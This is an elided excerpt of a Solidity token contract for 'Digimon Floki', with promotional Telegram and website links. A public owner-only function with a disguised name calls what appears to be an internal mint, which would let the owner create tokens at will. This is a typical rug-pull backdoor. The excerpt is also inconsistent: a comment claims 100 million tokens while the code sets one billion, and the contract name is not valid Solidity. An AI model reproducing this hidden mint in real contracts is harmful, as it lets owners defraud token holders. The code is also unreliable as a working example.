...
//
// $DigimonFloki proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/DigimonFlokiBEP
// 📱 Website ::https://digimonfloki.io/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _DigimonFloki(uint256 amount) public onlyOwner {
 _DigimonFloki(msg.sender, amount);
    }
    ...
    function _DigimonFloki(address account, uint256 amount) internal virtual {
...
contract $DigimonFloki is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Digimon Floki", "DIGIFLOKI") {
     _DigimonFloki(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}